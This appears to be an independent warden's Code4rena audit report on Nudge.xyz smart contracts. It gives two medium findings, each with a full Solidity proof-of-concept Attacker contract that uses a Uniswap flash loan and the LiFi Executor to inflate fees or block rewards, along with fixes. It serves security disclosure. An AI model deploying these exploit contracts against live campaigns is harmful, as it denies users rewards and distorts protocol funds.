# Audit Findings – Nudge.xyz

**Platform:** code4rena  
**Contest:** [Nudge.xyz](https://code4rena.com/audits/2025-03-nudgexyz)  
**Dates:** March 18, 2025 - March 25, 2025   
**Role:** Independent Warden
**Findings:** 2 Medium

---

## ⚠️ Medium Severity Findings

### M-01: Nudge fees are never deducted upon participation invalidations, leading to potential DoS

#### Description and impact
If a user's `NudgeCampaign` participation is invalidated then the `pendingRewards` variable is decreased but not `accumulatedFees`. If large particpations are repeatedly registered but then invalidated, then the `accumulatedFees` will continually increase, leading to outsized fees for the Nudge protocol with little benefit to the campaign. The fees may increase to a level where `NudgeCampaign::claimableRewardAmount()` is zero, causing DoS for users. It also possible a rogue Nudge employee could use this to gain inflated fees.

#### Proof of Concept
This issue can be exploited as follows:

1. Attacker takes a large flash loan of the target token
1. Attacker calls the Lifi `Executor` in such a way that `NudgeCampaign::handleReallocation` is called using the borrowed funds, which are transferred back to the attacker.
1. Attacker pays back the flash loan.

The attacker does not end up holding the required quantity of target token following the attack, so their participation will be invalidated, however the Nudge fee amount is not decreased.

The PoC below executes an example attack on mainnet, where the target token is GME and a flash loan is taken from a uniswap pool. It can be run by adding the a new Solidity file to the test folder with the below contents, and executed using:

```bash
forge test --match-test test_lifiFlashSwap -vvv --fork-url  <mainnet RPC URL> --fork-block-number 22090996 --etherscan-api-key <mainnet API key>
```

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import "forge-std/StdUtils.sol";
import {NudgeCampaign} from "../campaign/NudgeCampaign.sol";
import {NudgeCampaignFactory, INudgeCampaignFactory} from "../campaign/NudgeCampaignFactory.sol";
import {INudgeCampaign, IBaseNudgeCampaign} from "../campaign/interfaces/INudgeCampaign.sol";
import {ERC20, TestERC20} from "../mocks/TestERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

// Lifi interfaces (copied from https://github.com/lifinance/contracts/tree/main)
library LibSwap {
    struct SwapData {
        address callTo;
        address approveTo;
        address sendingAssetId;
        address receivingAssetId;
        uint256 fromAmount;
        bytes callData;
        bool requiresDeposit;
    }
}

interface ILifiExecutor {
    function swapAndExecute(
        bytes32 _transactionId,
        LibSwap.SwapData[] calldata _swapData,
        address _transferredAssetId,
        address payable _receiver,
        uint256 _amount
    ) external payable;
}

interface IUniswapV2Pool {
    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;
}

contract Attacker {
    address private immutable toToken;
    NudgeCampaign private immutable campaign;
    uint256 private immutable campaignId;
    address private immutable lifiExecutor;
    address private immutable ethGmePool;

    constructor(
        address toToken_,
        address campaign_,
        uint256 campaignId_,
        address lifiExecutor_,
        address ethGmePool_
    ) {
        toToken = toToken_;
        campaign = NudgeCampaign(payable(campaign_));
        campaignId = campaignId_;
        lifiExecutor = lifiExecutor_;
        ethGmePool = ethGmePool_;

        // Approve the Lifi ERC20 proxy
        IERC20(toToken).approve(0x5741A7FfE7c39Ca175546a54985fA79211290b51, type(uint256).max);
    }

    // Attack entry point
    function execute(uint256 amount) external {
        // Transfer the uniswap fee amount in from the caller
        IERC20(toToken).transferFrom(msg.sender, address(this), amount * 3 / 997 + 1);

        // Get the flash loan from the pool
        IUniswapV2Pool(ethGmePool).swap(0, amount, address(this), "d");
    }

    // Flash loan callback
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
        require(sender == address(this), "Sender must be this contract");
        require(msg.sender == ethGmePool, "Only trust the the pool");

        bytes memory handleReallocationCallData = abi.encodeWithSelector(
            campaign.handleReallocation.selector,
            campaignId,
            address(this), // userAddress
            address(toToken),
            amount1,
            ""
        );

        LibSwap.SwapData memory callCampaign = LibSwap.SwapData({
            callTo: address(campaign),
            approveTo: address(campaign),
            sendingAssetId: address(toToken),
            receivingAssetId: address(0),
            fromAmount: amount1,
            callData: handleReallocationCallData,
            requiresDeposit: false
        });

        LibSwap.SwapData[] memory swapData = new LibSwap.SwapData[](1);
        swapData[0] = callCampaign;

        ILifiExecutor(lifiExecutor).swapAndExecute(
            bytes32("id"),
            swapData,
            address(toToken),
            payable(address(this)),
            amount1
        );

        IERC20(toToken).transfer(ethGmePool, IERC20(toToken).balanceOf(address(this)));
    }
}

contract NudgeCampaignForkedTest is Test {
    NudgeCampaign private campaign;

    address constant GME = 0xc56C7A0eAA804f854B536A5F3D5f49D2EC4B12b8;
    uint256 constant GME_UNIT = 1e9;
    address constant ETH_GME_POOL = 0x2aEEe741fa1e21120a21E57Db9ee545428E683C9; // uniswap v2 pool
    address constant LIFI_EXECUTOR = 0x2dfaDAB8266483beD9Fd9A292Ce56596a2D1378D;

    address owner;
    uint256 constant REWARD_PPQ = 2e13;
    uint256 constant INITIAL_FUNDING = 100_000e18;
    uint256 constant BPS_DENOMINATOR = 1e4;
    uint256 constant PPQ_DENOMINATOR = 1e15;
    address swapCaller = LIFI_EXECUTOR;
    address campaignAdmin = address(14);
    address nudgeAdmin = address(15);
    address treasury = address(16);
    address operator = address(17);
    address alternativeWithdrawalAddress = address(16);
    address campaignAddress;
    uint32 holdingPeriodInSeconds = 60 * 60 * 24 * 7; // 7 days
    uint256 RANDOM_UUID = 111_222_333_444_555_666_777;
    IERC20 toToken;
    TestERC20 rewardToken;
    NudgeCampaignFactory factory;

    function setUp() public {
        owner = msg.sender;
        toToken = IERC20(GME);
        rewardToken = new TestERC20("Reward Token", "RT");
        factory = new NudgeCampaignFactory(treasury, nudgeAdmin, operator, swapCaller);

        campaignAddress = factory.deployCampaign(
            holdingPeriodInSeconds,
            address(toToken),
            address(rewardToken),
            REWARD_PPQ,
            campaignAdmin,
            0,
            alternativeWithdrawalAddress,
            RANDOM_UUID
        );
        campaign = NudgeCampaign(payable(campaignAddress));

        vm.deal(campaignAdmin, 10 ether);

        vm.prank(campaignAdmin);
        rewardToken.faucet(10_000_000e18);
        // Fund the campaign with reward tokens
        vm.prank(campaignAdmin);
        rewardToken.transfer(campaignAddress, INITIAL_FUNDING);
    }

    function test_lifiFlashSwap() public {
        // Deal target tokens as we need them to pay the flash loan fees
        deal(address(toToken), address(this), 1e9 * GME_UNIT);

        Attacker attacker = new Attacker(address(toToken), campaignAddress, RANDOM_UUID, LIFI_EXECUTOR, ETH_GME_POOL);
        toToken.approve(address(attacker), type(uint256).max);

        uint256[] memory pIDs = new uint256[](1);

        for (uint i = 0; campaign.claimableRewardAmount() > 0.0001e18; i++) {
            // Execute the attack using the maximum possible amount of the target token
            uint256 toAmount = (campaign.claimableRewardAmount() * PPQ_DENOMINATOR / REWARD_PPQ) / 1e9;
            attacker.execute(toAmount);

            (IBaseNudgeCampaign.ParticipationStatus status,
            address userAddress,
            uint256 participationAmount,,,) = campaign.participations(i + 1);

            assertEq(uint256(status), uint256(IBaseNudgeCampaign.ParticipationStatus.PARTICIPATING), "Should be participating");
            assertEq(userAddress, address(attacker), "Should have expected user address");
            assertEq(toAmount, participationAmount, "Must have expected participation amount");

            // Operator invalidates the participation
            pIDs[0] = i + 1;
            vm.prank(operator);
            campaign.invalidateParticipations(pIDs);

            assertEq(campaign.pendingRewards(), 0, "Pending rewards go back to zero");
        }

        assertGt(campaign.accumulatedFees(), INITIAL_FUNDING * 999 / 1000, "Accumulated fees exhaust 99.9% of initial funding");
    }
}
```
#### Recommendation
Consider modifying `NudgeCampaign::invalidateParticipations` so as to decrement the `accumulatedFees` variable by the fee amount associated with that participation. This may introduce issues however as if `NudgeCampaign::collectFees` is called first, then `accumulatedFees` will be zero and arithmetic overflow will occur. To mitigate this you might want to consider having another storage variable - `withdrawableFees` - which is only increased when a user claims their rewards. It would need to increase by the fee amount associated with the relevant participation(s). The `collectFees` would be modified so it is only able to withdraw the withdrawableFees amount, and would set it zero after performing the transfer to the nudge treasury. This changes the behavior of the contract from a business point of view, as only "completed" participations would earn fees for Nudge, so this would need to be carefully considered.

**Submission details:** https://code4rena.com/audits/2025-03-nudgexyz/submissions/S-797

### M-02: NudgeCampaign is susceptible to flash-loan based DoS attack

#### Description and impact
A user seeking to cause disruption to a particular project's campaign can cause DoS by:

1. Taking out a flash loan from a liquidity pool;
1. Use the borrowed funds to participate in the campaign and
1. Setting the `userAddress` for the participation as the pool address.

If the pool has sufficient liquidity available then this may cause all the current unallocated rewards to be allocated for the pool's participation, leaving other users unable to participate. Depending on market conditions, it may be likely for the pool to maintain sufficient balance of the target token so its participation would not automatically be invalidated by Nudge's backend systems, causing the DoS to continue.

The primary impact is a temporary DoS: manual intervention could be used to invalidate the pool's participation, thereby freeing up the reward tokens so other users can participate.

#### Proof of Concept
The below PoC simulates the affect of using a flash loan from uniswap on mainnet, with GME as the target token. It can be run using:

```bash
forge test --match-test test_registerPoolParticipation -vvv --fork-url  <mainnet RPC url> --fork-block-number 22090996 --etherscan-api-key <mainnet API key>
```

Add a new test file under the test folder:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import "forge-std/StdUtils.sol";
import {NudgeCampaign} from "../campaign/NudgeCampaign.sol";
import {NudgeCampaignFactory, INudgeCampaignFactory} from "../campaign/NudgeCampaignFactory.sol";
import {INudgeCampaign, IBaseNudgeCampaign} from "../campaign/interfaces/INudgeCampaign.sol";
import {ERC20, TestERC20} from "../mocks/TestERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

// Lifi interfaces (copied from https://github.com/lifinance/contracts/tree/main)
library LibSwap {
    struct SwapData {
        address callTo;
        address approveTo;
        address sendingAssetId;
        address receivingAssetId;
        uint256 fromAmount;
        bytes callData;
        bool requiresDeposit;
    }
}

interface ILifiExecutor {
    function swapAndExecute(
        bytes32 _transactionId,
        LibSwap.SwapData[] calldata _swapData,
        address _transferredAssetId,
        address payable _receiver,
        uint256 _amount
    ) external payable;
}

interface IUniswapV2Pool {
    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;
}

contract Attacker {
    address private immutable toToken;
    NudgeCampaign private immutable campaign;
    uint256 private immutable campaignId;
    address private immutable lifiExecutor;
    address private immutable ethGmePool;

    constructor(
        address toToken_,
        address campaign_,
        uint256 campaignId_,
        address lifiExecutor_,
        address ethGmePool_
    ) {
        toToken = toToken_;
        campaign = NudgeCampaign(payable(campaign_));
        campaignId = campaignId_;
        lifiExecutor = lifiExecutor_;
        ethGmePool = ethGmePool_;

        // Approve the Lifi ERC20 proxy
        IERC20(toToken).approve(0x5741A7FfE7c39Ca175546a54985fA79211290b51, type(uint256).max);
    }

    // Attack entry point
    function execute(uint256 amount) external {
        // Transfer the uniswap fee amount in from the caller
        IERC20(toToken).transferFrom(msg.sender, address(this), amount * 3 / 997 + 1);

        // Get the flash loan from the pool
        IUniswapV2Pool(ethGmePool).swap(0, amount, address(this), "d");
    }

    // Flash loan callback
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
        require(sender == address(this), "Sender must be this contract");
        require(msg.sender == ethGmePool, "Only trust the the pool");

        bytes memory handleReallocationCallData = abi.encodeWithSelector(
            campaign.handleReallocation.selector,
            campaignId,
            ethGmePool, // send back tokens to the pool
            address(toToken),
            amount1,
            ""
        );

        LibSwap.SwapData memory callCampaign = LibSwap.SwapData({
            callTo: address(campaign),
            approveTo: address(campaign),
            sendingAssetId: address(toToken),
            receivingAssetId: address(0),
            fromAmount: amount1,
            callData: handleReallocationCallData,
            requiresDeposit: false
        });

        LibSwap.SwapData[] memory swapData = new LibSwap.SwapData[](1);
        swapData[0] = callCampaign;

        ILifiExecutor(lifiExecutor).swapAndExecute(
            bytes32("id"),
            swapData,
            address(toToken),
            payable(ethGmePool),
            amount1
        );

        IERC20(toToken).transfer(ethGmePool, IERC20(toToken).balanceOf(address(this)));
    }
}

contract NudgeCampaignForkedTest is Test {
    NudgeCampaign private campaign;

    address constant GME = 0xc56C7A0eAA804f854B536A5F3D5f49D2EC4B12b8;
    uint256 constant GME_UNIT = 1e9;
    address constant ETH_GME_POOL = 0x2aEEe741fa1e21120a21E57Db9ee545428E683C9; // uniswap v2 pool
    address constant LIFI_EXECUTOR = 0x2dfaDAB8266483beD9Fd9A292Ce56596a2D1378D;

    address owner;
    uint256 constant REWARD_PPQ = 2e13;
    uint256 constant INITIAL_FUNDING = 100_000e18;
    uint256 constant BPS_DENOMINATOR = 1e4;
    uint256 constant PPQ_DENOMINATOR = 1e15;
    address swapCaller = LIFI_EXECUTOR;
    address campaignAdmin = address(14);
    address nudgeAdmin = address(15);
    address treasury = address(16);
    address operator = address(17);
    address alternativeWithdrawalAddress = address(16);
    address campaignAddress;
    uint32 holdingPeriodInSeconds = 60 * 60 * 24 * 7; // 7 days
    uint256 RANDOM_UUID = 111_222_333_444_555_666_777;
    IERC20 toToken;
    TestERC20 rewardToken;
    NudgeCampaignFactory factory;

    function setUp() public {
        owner = msg.sender;
        toToken = IERC20(GME);
        rewardToken = new TestERC20("Reward Token", "RT");
        factory = new NudgeCampaignFactory(treasury, nudgeAdmin, operator, swapCaller);

        campaignAddress = factory.deployCampaign(
            holdingPeriodInSeconds,
            address(toToken),
            address(rewardToken),
            REWARD_PPQ,
            campaignAdmin,
            0,
            alternativeWithdrawalAddress,
            RANDOM_UUID
        );
        campaign = NudgeCampaign(payable(campaignAddress));

        vm.deal(campaignAdmin, 10 ether);

        vm.prank(campaignAdmin);
        rewardToken.faucet(10_000_000e18);
        // Fund the campaign with reward tokens
        vm.prank(campaignAdmin);
        rewardToken.transfer(campaignAddress, INITIAL_FUNDING);
    }

    function test_registerPoolParticipation() public {
        // Deal target tokens as we need them to pay the flash loan fees
        deal(address(toToken), address(this), 1e9 * GME_UNIT);

        Attacker attacker = new Attacker(address(toToken), campaignAddress, RANDOM_UUID, LIFI_EXECUTOR, ETH_GME_POOL);
        toToken.approve(address(attacker), type(uint256).max);

        // Execute attack using the maximum possible amount
        uint256 toAmount = (campaign.claimableRewardAmount() * PPQ_DENOMINATOR / REWARD_PPQ) / 1e9;
        attacker.execute(toAmount);
        assertEq(campaign.claimableRewardAmount(), 0, "Claimable reward amount goes to zero");

        (IBaseNudgeCampaign.ParticipationStatus status,
        address userAddress,
        uint256 participationAmount,,,) = campaign.participations(1);

        assertEq(uint256(status), uint256(IBaseNudgeCampaign.ParticipationStatus.PARTICIPATING), "Should be participating");
        assertEq(userAddress, ETH_GME_POOL, "Should have expected user address");
        assertEq(toAmount, participationAmount, "Must have expected participation amount");
    }
}
```

#### Recommendation
When registering participation of a contract account, consider using a callback function on the contract, rather than just a transfer. For example, add the following interface:

```solidity
interface INudgeCampaignParticipant {
    function onRegistration(
        uint256 campaignId_,
        address toToken,
        uint256 toAmount,
        bytes memory data
    ) external;
}
```

Then at the very end of `NudgeCampaign::handleReallocation` add a call to the participant if it is a contract:

```solidity
if (userAddress.code.length > 0) {
    INudgeCampaignParticipant(userAddress).onRegistration(campaignId_, toToken, toAmount, data);
}
```

**Submission details:** https://code4rena.com/audits/2025-03-nudgexyz/submissions/S-807
